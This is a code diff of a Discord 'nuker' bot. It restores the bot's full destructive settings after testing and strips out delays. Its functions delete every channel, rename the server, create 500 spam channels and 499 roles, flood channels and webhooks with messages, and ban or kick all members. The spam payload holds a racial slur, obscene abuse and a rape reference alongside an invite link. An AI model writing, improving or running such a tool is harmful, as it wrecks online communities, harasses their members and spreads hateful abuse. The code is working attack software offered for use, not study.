@@ -806,7 +806,7 @@ async def run_nuker(token: str, coro):
     intents = discord.Intents.default()
     intents.members = True
     intents.messages = True
-    intents.guilds = True  # Added guilds intent
+    intents.guilds = True
     
     bot = commands.Bot(command_prefix=".", intents=intents, help_command=None)
 
@@ -858,7 +858,7 @@ async def fast_nuke(bot):
         print(f"{Fore.RED}[ERROR] Invalid server ID!{Style.RESET_ALL}")
         return
     
-    # Try to fetch guild - first from cache, then from API
+    # Try to fetch guild
     g = bot.get_guild(gid)
     if not g:
         print(f"{Fore.YELLOW}[INFO] Guild not in cache, fetching from API...{Style.RESET_ALL}")
@@ -876,11 +876,11 @@ async def fast_nuke(bot):
     spam = "@everyone officially get fucked by null xd just fuck yourself nigger https://discord.gg/P9kDd7pEBd"
     names = ["NULL-OWNS-THIS", "NULL-RAPED-YALL", "NULL-FUCKS-YOUR-SERVER", "NULL-HERE"]
 
-    # Start editing server name
+    # Start editing server name - NO DELAY
     print(f"{Fore.YELLOW}[INFO] Changing server name...{Style.RESET_ALL}")
     edit_task = asyncio.create_task(safe_edit(g, name="Territory of Null"))
     
-    # Delete all channels in parallel
+    # Delete all channels in parallel - NO DELAY
     print(f"{Fore.YELLOW}[INFO] Deleting all channels...{Style.RESET_ALL}")
     delete_tasks = [c.delete() for c in g.channels]
     delete_results = await asyncio.gather(*delete_tasks, return_exceptions=True)
@@ -891,40 +891,69 @@ async def fast_nuke(bot):
     print(f"{Fore.YELLOW}[INFO] Creating spam channels...{Style.RESET_ALL}")
     async def create_and_spam():
         create_tasks = []
-        for i in range(50):  # Reduced from 500 to 50 for testing
+        for i in range(500):  # BACK TO 500 CHANNELS
             name = f"{random.choice(names)}-{i+1}"
             create_tasks.append(g.create_text_channel(name))
         
-        # Create channels
+        # Create channels with minimal logging
         created = []
         successful = 0
         failed = 0
         
-        for i, task in enumerate(asyncio.as_completed(create_tasks)):
-            try:
-                ch = await task
-                created.append(ch)
-                successful += 1
-                print(f"{Fore.GREEN}[CHANNEL] Created #{ch.name}{Style.RESET_ALL}")
-            except Exception as e:
-                failed += 1
-                print(f"{Fore.RED}[ERROR] Failed to create channel {i+1}: {e}{Style.RESET_ALL}")
-                if failed > 5:  # Stop if too many failures
-                    break
+        # Process channels in batches for speed
+        batch_size = 50
+        for i in range(0, len(create_tasks), batch_size):
+            batch = create_tasks[i:i+batch_size]
+            batch_results = await asyncio.gather(*batch, return_exceptions=True)
+            
+            for j, result in enumerate(batch_results):
+                idx = i + j + 1
+                if isinstance(result, discord.TextChannel):
+                    ch = result
+                    created.append(ch)
+                    successful += 1
+                    if successful % 50 == 0:  # Log every 50 channels
+                        print(f"{Fore.GREEN}[CHANNEL] Created #{ch.name} (Total: {successful}){Style.RESET_ALL}")
+                else:
+                    failed += 1
+                    if failed < 10:  # Only log first 10 failures
+                        print(f"{Fore.RED}[ERROR] Failed to create channel {idx}: {result}{Style.RESET_ALL}")
+            
+            # No delay between batches
         
         print(f"{Fore.GREEN}[SUCCESS] Created {successful} channels, {failed} failed{Style.RESET_ALL}")
         
         if created:
             print(f"{Fore.YELLOW}[INFO] Sending spam messages...{Style.RESET_ALL}")
+            # Send messages to ALL channels simultaneously - NO BATCHING
             spam_tasks = []
-            for ch in created:
-                for _ in range(5):  # Reduced from 15 to 5 for testing
+            for ch_idx, ch in enumerate(created):
+                for msg_idx in range(15):  # BACK TO 15 MESSAGES PER CHANNEL
                     spam_tasks.append(ch.send(spam))
+                    if len(spam_tasks) % 100 == 0:  # Log progress
+                        print(f"{Fore.CYAN}[MESSAGE] Queued {len(spam_tasks)} messages...{Style.RESET_ALL}")
             
-            # Execute all spam tasks in parallel
+            print(f"{Fore.YELLOW}[INFO] Executing {len(spam_tasks)} message sends...{Style.RESET_ALL}")
+            
+            # Execute all spam tasks in parallel with NO DELAY
             spam_results = await asyncio.gather(*spam_tasks, return_exceptions=True)
+            
+            # Count results
             spam_success = sum(1 for r in spam_results if not isinstance(r, Exception))
-            print(f"{Fore.GREEN}[SUCCESS] Sent {spam_success}/{len(spam_tasks)} messages{Style.RESET_ALL}")
+            spam_failed = sum(1 for r in spam_results if isinstance(r, Exception))
+            
+            print(f"{Fore.GREEN}[SUCCESS] Sent {spam_success}/{len(spam_tasks)} messages, {spam_failed} failed{Style.RESET_ALL}")
+            
+            # Log some successful sends
+            success_count = 0
+            for i, result in enumerate(spam_results[:10]):  # Log first 10 successes
+                if not isinstance(result, Exception):
+                    success_count += 1
+                    if success_count <= 5:  # Only log 5
+                        ch_idx = i // 15
+                        msg_idx = i % 15
+                        ch_name = created[ch_idx].name if ch_idx < len(created) else "unknown"
+                        print(f"{Fore.GREEN}[MESSAGE] Sent message {msg_idx+1} in #{ch_name}{Style.RESET_ALL}")
         
         return created
     
@@ -957,11 +986,11 @@ async def nuke(bot):
     
     print(f"{Fore.GREEN}[SUCCESS] Found guild: {g.name} (ID: {g.id}){Style.RESET_ALL}")
     
-    # Start editing server name
+    # Start editing server name - NO DELAY
     print(f"{Fore.YELLOW}[INFO] Changing server name to '{name}'...{Style.RESET_ALL}")
     edit_task = asyncio.create_task(safe_edit(g, name=name))
     
-    # Delete all channels in parallel
+    # Delete all channels in parallel - NO DELAY
     print(f"{Fore.YELLOW}[INFO] Deleting all channels...{Style.RESET_ALL}")
     delete_tasks = [c.delete() for c in g.channels]
     delete_results = await asyncio.gather(*delete_tasks, return_exceptions=True)
@@ -971,36 +1000,64 @@ async def nuke(bot):
     async def create_and_spam():
         created = []
         create_tasks = []
-        for i in range(50):  # Reduced from 500 to 50 for testing
+        for i in range(500):  # BACK TO 500 CHANNELS
             create_tasks.append(g.create_text_channel(f"{chname}-{i+1}"))
         
         # Create channels
         successful = 0
         failed = 0
-        for i, task in enumerate(asyncio.as_completed(create_tasks)):
-            try:
-                ch = await task
-                created.append(ch)
-                successful += 1
-                print(f"{Fore.GREEN}[CHANNEL] Created #{ch.name}{Style.RESET_ALL}")
-            except Exception as e:
-                failed += 1
-                print(f"{Fore.RED}[ERROR] Failed to create channel {i+1}: {e}{Style.RESET_ALL}")
-                if failed > 5:
-                    break
+        
+        # Process in batches for speed
+        batch_size = 50
+        for i in range(0, len(create_tasks), batch_size):
+            batch = create_tasks[i:i+batch_size]
+            batch_results = await asyncio.gather(*batch, return_exceptions=True)
+            
+            for j, result in enumerate(batch_results):
+                idx = i + j + 1
+                if isinstance(result, discord.TextChannel):
+                    ch = result
+                    created.append(ch)
+                    successful += 1
+                    if successful % 50 == 0:  # Log every 50 channels
+                        print(f"{Fore.GREEN}[CHANNEL] Created #{ch.name} (Total: {successful}){Style.RESET_ALL}")
+                else:
+                    failed += 1
+                    if failed < 10:  # Only log first 10 failures
+                        print(f"{Fore.RED}[ERROR] Failed to create channel {idx}: {result}{Style.RESET_ALL}")
+            
+            # No delay between batches
         
         print(f"{Fore.GREEN}[SUCCESS] Created {successful} channels, {failed} failed{Style.RESET_ALL}")
         
         if created:
             print(f"{Fore.YELLOW}[INFO] Sending spam messages...{Style.RESET_ALL}")
+            # Send messages to ALL channels simultaneously
             spam_tasks = []
-            for ch in created:
-                for _ in range(5):  # Reduced from 15 to 5 for testing
+            for ch_idx, ch in enumerate(created):
+                for msg_idx in range(15):  # BACK TO 15 MESSAGES PER CHANNEL
                     spam_tasks.append(ch.send(msg))
+                    if len(spam_tasks) % 100 == 0:  # Log progress
+                        print(f"{Fore.CYAN}[MESSAGE] Queued {len(spam_tasks)} messages...{Style.RESET_ALL}")
+            
+            print(f"{Fore.YELLOW}[INFO] Executing {len(spam_tasks)} message sends...{Style.RESET_ALL}")
             
             spam_results = await asyncio.gather(*spam_tasks, return_exceptions=True)
             spam_success = sum(1 for r in spam_results if not isinstance(r, Exception))
-            print(f"{Fore.GREEN}[SUCCESS] Sent {spam_success}/{len(spam_tasks)} messages{Style.RESET_ALL}")
+            spam_failed = sum(1 for r in spam_results if isinstance(r, Exception))
+            
+            print(f"{Fore.GREEN}[SUCCESS] Sent {spam_success}/{len(spam_tasks)} messages, {spam_failed} failed{Style.RESET_ALL}")
+            
+            # Log some successful sends
+            success_count = 0
+            for i, result in enumerate(spam_results[:10]):
+                if not isinstance(result, Exception):
+                    success_count += 1
+                    if success_count <= 5:
+                        ch_idx = i // 15
+                        msg_idx = i % 15
+                        ch_name = created[ch_idx].name if ch_idx < len(created) else "unknown"
+                        print(f"{Fore.GREEN}[MESSAGE] Sent message {msg_idx+1} in #{ch_name}{Style.RESET_ALL}")
         
         return created
     
@@ -1039,22 +1096,32 @@ async def raid(bot):
         print(f"{Fore.YELLOW}[INFO] No text channels found{Style.RESET_ALL}")
         return
     
-    # Send messages to all text channels in parallel
+    # Send messages to all text channels in parallel - BACK TO 50 MESSAGES
     tasks = []
-    for ch in text_channels:
-        for _ in range(5):  # Reduced from 50 to 5 for testing
+    for ch_idx, ch in enumerate(text_channels):
+        for msg_idx in range(50):  # BACK TO 50 MESSAGES PER CHANNEL
             tasks.append(ch.send(msg))
+            if len(tasks) % 100 == 0:  # Log progress
+                print(f"{Fore.CYAN}[MESSAGE] Queued {len(tasks)} messages...{Style.RESET_ALL}")
     
     print(f"{Fore.YELLOW}[INFO] Sending {len(tasks)} messages...{Style.RESET_ALL}")
     
     if tasks:
+        # Execute ALL tasks simultaneously - NO BATCHING
         results = await asyncio.gather(*tasks, return_exceptions=True)
         success_count = sum(1 for r in results if not isinstance(r, Exception))
         failed_count = sum(1 for r in results if isinstance(r, Exception))
         
+        # Log successes
+        success_logged = 0
         for i, result in enumerate(results):
-            if isinstance(result, Exception):
-                print(f"{Fore.RED}[ERROR] Message {i+1} failed: {result}{Style.RESET_ALL}")
+            if not isinstance(result, Exception) and success_logged < 5:
+                ch_idx = i // 50
+                msg_idx = i % 50
+                if ch_idx < len(text_channels):
+                    ch_name = text_channels[ch_idx].name
+                    print(f"{Fore.GREEN}[MESSAGE] Sent message {msg_idx+1} in #{ch_name}{Style.RESET_ALL}")
+                    success_logged += 1
         
         print(f"{Fore.GREEN}[SUCCESS] Raid completed! Sent {success_count} messages, {failed_count} failed{Style.RESET_ALL}")
     else:
@@ -1071,19 +1138,30 @@ async def webhook_spam(_):  # no bot needed
 
     async with aiohttp.ClientSession() as session:
         tasks = []
-        for url in urls:
+        for url_idx, url in enumerate(urls):
             try:
                 wh = discord.Webhook.from_url(url, session=session)
-                for _ in range(10):  # Reduced from 100 to 10 for testing
+                for msg_idx in range(100):  # BACK TO 100 MESSAGES PER WEBHOOK
                     tasks.append(wh.send(msg, wait=False))
-                print(f"{Fore.GREEN}[WEBHOOK] Added webhook: {url[:50]}...{Style.RESET_ALL}")
+                    if len(tasks) % 100 == 0:  # Log progress
+                        print(f"{Fore.CYAN}[WEBHOOK] Queued {len(tasks)} webhook messages...{Style.RESET_ALL}")
+                print(f"{Fore.GREEN}[WEBHOOK] Added webhook {url_idx+1}: {url[:50]}...{Style.RESET_ALL}")
             except Exception as e:
-                print(f"{Fore.RED}[ERROR] Invalid webhook URL: {url[:50]}... - {e}{Style.RESET_ALL}")
+                print(f"{Fore.RED}[ERROR] Invalid webhook URL {url_idx+1}: {url[:50]}... - {e}{Style.RESET_ALL}")
         
         if tasks:
             print(f"{Fore.YELLOW}[INFO] Sending {len(tasks)} webhook messages...{Style.RESET_ALL}")
+            # Execute ALL tasks simultaneously
             results = await asyncio.gather(*tasks, return_exceptions=True)
             success_count = sum(1 for r in results if not isinstance(r, Exception))
+            
+            # Log some successes
+            success_logged = 0
+            for i, result in enumerate(results[:10]):
+                if not isinstance(result, Exception) and success_logged < 5:
+                    print(f"{Fore.GREEN}[WEBHOOK] Sent message {i+1}{Style.RESET_ALL}")
+                    success_logged += 1
+            
             print(f"{Fore.GREEN}[SUCCESS] Webhook spam completed! Sent {success_count} messages{Style.RESET_ALL}")
         else:
             print(f"{Fore.YELLOW}[INFO] No valid webhooks found{Style.RESET_ALL}")
@@ -1117,20 +1195,23 @@ async def webhook_flood(bot):
     
     urls = []
     tasks = []
-    for ch in text_channels:
-        for _ in range(3):
+    for ch_idx, ch in enumerate(text_channels):
+        for wh_idx in range(3):
             tasks.append(ch.create_webhook(name=name))
+            if len(tasks) % 10 == 0:  # Log progress
+                print(f"{Fore.CYAN}[WEBHOOK] Queued {len(tasks)} webhook creations...{Style.RESET_ALL}")
     
     print(f"{Fore.YELLOW}[INFO] Creating {len(tasks)} webhooks...{Style.RESET_ALL}")
     
-    # Create webhooks in parallel
+    # Create webhooks in parallel - ALL AT ONCE
     results = await asyncio.gather(*tasks, return_exceptions=True)
     for i, result in enumerate(results):
         if isinstance(result, discord.Webhook):
             urls.append(result.url)
-            print(f"{Fore.GREEN}[WEBHOOK] Created webhook #{i+1}{Style.RESET_ALL}")
-        elif isinstance(result, Exception):
-            print(f"{Fore.RED}[ERROR] Failed to create webhook #{i+1}: {result}{Style.RESET_ALL}")
+            if i < 10:  # Log first 10 successes
+                print(f"{Fore.GREEN}[WEBHOOK] Created webhook {i+1}{Style.RESET_ALL}")
+        elif i < 10:  # Log first 10 failures
+            print(f"{Fore.RED}[ERROR] Failed to create webhook {i+1}: {result}{Style.RESET_ALL}")
 
     with open("webhooks.txt", "w", encoding="utf-8") as f:
         f.write("\n".join(urls))
@@ -1164,9 +1245,17 @@ async def role_delete(bot):
     
     if roles_to_delete:
         print(f"{Fore.YELLOW}[INFO] Deleting roles...{Style.RESET_ALL}")
+        # Delete ALL roles simultaneously
         tasks = [r.delete() for r in roles_to_delete]
         results = await asyncio.gather(*tasks, return_exceptions=True)
         success_count = sum(1 for r in results if not isinstance(r, Exception))
+        
+        # Log successes
+        for i, result in enumerate(results[:5]):
+            if not isinstance(result, Exception):
+                role_name = roles_to_delete[i].name if i < len(roles_to_delete) else f"role_{i+1}"
+                print(f"{Fore.GREEN}[ROLE] Deleted role: {role_name}{Style.RESET_ALL}")
+        
         print(f"{Fore.GREEN}[SUCCESS] Role deletion completed! Deleted {success_count}/{len(roles_to_delete)} roles{Style.RESET_ALL}")
     else:
         print(f"{Fore.YELLOW}[INFO] No roles to delete{Style.RESET_ALL}")
@@ -1206,15 +1295,29 @@ async def role_spam(bot):
     
     if members:
         print(f"{Fore.YELLOW}[INFO] Adding role to members...{Style.RESET_ALL}")
+        # Add role to ALL members simultaneously
         add_tasks = [m.add_roles(first) for m in members]
         add_results = await asyncio.gather(*add_tasks, return_exceptions=True)
         add_success = sum(1 for r in add_results if not isinstance(r, Exception))
+        
+        # Log some successes
+        for i, result in enumerate(add_results[:5]):
+            if not isinstance(result, Exception) and i < len(members):
+                member_name = members[i].name
+                print(f"{Fore.GREEN}[ROLE] Added role to: {member_name}{Style.RESET_ALL}")
+        
         print(f"{Fore.GREEN}[SUCCESS] Added role to {add_success}/{len(members)} members{Style.RESET_ALL}")
 
     print(f"{Fore.YELLOW}[INFO] Creating additional roles...{Style.RESET_ALL}")
-    create_tasks = [g.create_role(name=name) for _ in range(50)]  # Reduced from 499 to 50
+    # Create ALL roles simultaneously
+    create_tasks = [g.create_role(name=name) for _ in range(499)]  # BACK TO 499 ROLES
     create_results = await asyncio.gather(*create_tasks, return_exceptions=True)
     create_success = sum(1 for r in create_results if not isinstance(r, Exception))
+    
+    # Log some successes
+    for i, result in enumerate(create_results[:5]):
+        if not isinstance(result, Exception):
+            print(f"{Fore.GREEN}[ROLE] Created additional role {i+1}{Style.RESET_ALL}")
     
     print(f"{Fore.GREEN}[SUCCESS] Role spam completed! Created {create_success} additional roles{Style.RESET_ALL}")
 
@@ -1245,9 +1348,17 @@ async def ban_all(bot):
     
     if members_to_ban:
         print(f"{Fore.YELLOW}[INFO] Banning members...{Style.RESET_ALL}")
+        # Ban ALL members simultaneously
         tasks = [m.ban(reason="null xd", delete_message_days=0) for m in members_to_ban]
         results = await asyncio.gather(*tasks, return_exceptions=True)
         success_count = sum(1 for r in results if not isinstance(r, Exception))
+        
+        # Log some successes
+        for i, result in enumerate(results[:5]):
+            if not isinstance(result, Exception) and i < len(members_to_ban):
+                member_name = members_to_ban[i].name
+                print(f"{Fore.GREEN}[BAN] Banned: {member_name}{Style.RESET_ALL}")
+        
         print(f"{Fore.GREEN}[SUCCESS] Ban all completed! Banned {success_count}/{len(members_to_ban)} members{Style.RESET_ALL}")
     else:
         print(f"{Fore.YELLOW}[INFO] No members to ban{Style.RESET_ALL}")
@@ -1279,9 +1390,17 @@ async def kick_all(bot):
     
     if members_to_kick:
         print(f"{Fore.YELLOW}[INFO] Kicking members...{Style.RESET_ALL}")
+        # Kick ALL members simultaneously
         tasks = [m.kick(reason="null owns") for m in members_to_kick]
         results = await asyncio.gather(*tasks, return_exceptions=True)
         success_count = sum(1 for r in results if not isinstance(r, Exception))
+        
+        # Log some successes
+        for i, result in enumerate(results[:5]):
+            if not isinstance(result, Exception) and i < len(members_to_kick):
+                member_name = members_to_kick[i].name
+                print(f"{Fore.GREEN}[KICK] Kicked: {member_name}{Style.RESET_ALL}")
+        
         print(f"{Fore.GREEN}[SUCCESS] Kick all completed! Kicked {success_count}/{len(members_to_kick)} members{Style.RESET_ALL}")
     else:
         print(f"{Fore.YELLOW}[INFO] No members to kick{Style.RESET_ALL}")
